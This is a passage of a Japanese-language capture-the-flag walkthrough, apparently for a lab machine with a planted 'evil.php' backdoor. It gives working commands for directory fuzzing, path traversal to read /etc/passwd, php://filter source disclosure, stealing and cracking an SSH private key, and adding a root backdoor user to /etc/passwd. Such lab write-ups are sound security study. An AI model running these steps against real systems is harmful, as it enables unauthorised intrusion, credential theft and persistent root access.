...
- Webサイトを見る
  - サイトを見ても単なるApacheのdefaultのサイト
  - htmlソースを見るが、特に何もなし

- 隠しファイルを探す
  - `gobuster dir -u $IP -w /usr/share/wordlists/dirb/common.txt -x html,txt,php`
  - `-x`をつけると辞書の単語に対して指定の拡張子をつけることができる
  - 本の解説には`-x`オプションが付いているが、他のgobusterではつけてないのに、なぜここではついているのかわからない
  - secretという怪しいディレクトリがある
- ブラウザで`/secret`ディレクトリを見ても真っ白なので、ソースコードを見ると1~5の数字が書いてある。さらに隠しファイルを探してみる
- `gobuster dir -u $IP/secret/ -w /usr/share/wordlists/dirb/common.txt -x html,txt,php`
  - `/usr/share/wordlists/dirb/common.txt`でもいい 
  - `evil.php`という怪しいファイルがある
  

- `evil.php`を見ても何もない。ただし`evil.php`は明らかに怪しい名前のファイルなので、もしかしたらハッカーが設置したバックドアかもしれない
...
- `wfuzz -u "$IP/secret/evil.php?FUZZ=../../../../etc/passwd" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hw 0`
  - FUZZの部分が順に指定した辞書の単語に入れ替わる
  - ここでは`command`が当てはまったのでディレクトリ トラリバーサル攻撃ができる
  - `--hw 0`はwordが0ならhideする
  - /var/www/html/secret/evil.phpだと仮定すると、`../../../../`
...
- mowreeの暗号鍵を取得する
  ...
  - id_rsaの権限を変える。秘密鍵は所有者しか使うことができないので、権限を変える。これをしないとsshで接続できない
  - `chmod 600 id_rsa`


- sshするがパスフレーズが設定されていて失敗する

- パスワードのハッシュ値を作る
  - `ssh2john id_rsa > pass_hash.txt`
...
- システム内探索ランキングを使う。その中から書き込み可能なファイルを探す
  - `find / -type f -writable 2> /dev/null`
  - `/etc/passwd`に書き込みができるのがわかる

- バックドアを仕込む。passwdファイルに自分のユーザ(root権限を持つ)を書き込んで、いつでも出入りできるようにする
- ParrotOS側でパスワードを作成する
  - `openssl passwd -1 -salt usersalt`
  - 自分で適当にpasswordを入れる、ここでは`pass`としておく
  - `-salt saltの値` saltとはpasswordをランダムにするもの
...
### (参考)ディレクトリトラバーサルできたらすべきこと
- PHPラッパーストリーム
- 各ユーザの/user/.ssh/id_rsa
- それ以外は設定ファイルやテキストなど

### (参考)PHPのコードを見る
- PHP:filter(PHPストリームラッパー)でコードを見る。これはブラウザがhtmlを読み込む前に、コードを変換させることで、コードをそのまま表示させてしまうこと。
- `http://~/secret/evil.php?command=php://filter/convert.base64-encode/resource=evil.php`
  - copyする
  - ブラウザの拡張機能のLFIを参考にする 
- `echo ペースト | base64 -d`
...
- WFuzz
- osコマンドインジェクションかディレクトリトラバーサルのどちらが使えるかはわからないので、両方試してみる
- osコマンドインジェクションのチェック
- `wfuzz -u "$URL/secret/evil.php?FUZZ=id" -w /usr/share/wordlists/dirb/common.tx --hw 0`
  - 何も引っかからないので、多分これはosコマンドインジェクションではない
